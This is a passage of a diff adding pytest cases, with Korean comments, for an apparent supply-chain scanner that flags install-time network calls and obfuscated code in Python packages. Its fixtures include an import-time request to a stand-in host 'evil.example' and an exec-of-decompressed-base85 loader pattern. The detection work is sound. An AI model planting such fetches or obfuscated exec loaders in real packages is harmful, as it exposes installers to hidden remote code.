+         "    return requests.get(url, timeout=3)\nlatest('p')\n", False),
+        # 같은 이름에 다른 주소도 대입된다
+        ("import requests\nurl = 'https://pypi.org/x'\nurl = 'https://evil.example/c'\n"
+         "requests.get(url)\n", True),
+        # matplotlib — URL 이면 받고 아니면 파일을 여는 도우미
+        ("import urllib.request\ndef _open(fname):\n"
+         "    if fname.startswith(('http://', 'https://')):\n"
+         "        return urllib.request.urlopen(fname)\n    return open(fname)\n"
+         "RC = _open('matplotlibrc')\n", False),
+    ],
+)
+def test_registry_variable_and_url_or_file_helper(src, high):
+    files = {**_INIT, "p-1/pkg/__init__.py": src}
+    assert (RULE_INSTALL_TIME in _high_rules(files)) is high
+
+
+def test_vendored_blob_with_decode_utf8_is_medium():
+    """hpcp 실제 형태: exec(lzma.decompress(base64.a85decode(_SRC)).decode("utf-8"), m.__dict__)"""
+    import base64
+    import lzma
+
+    blob = base64.a85encode(lzma.compress(_LIB.encode())).decode()
+    src = (f"import base64, lzma, types\nmultiCMD = types.ModuleType('m')\n_SRC = {blob!r}\n"
+           "exec(lzma.decompress(base64.a85decode(_SRC)).decode('utf-8'), multiCMD.__dict__)\n")
+    assert [f.severity for f in _obf(src)] == [Severity.MEDIUM]
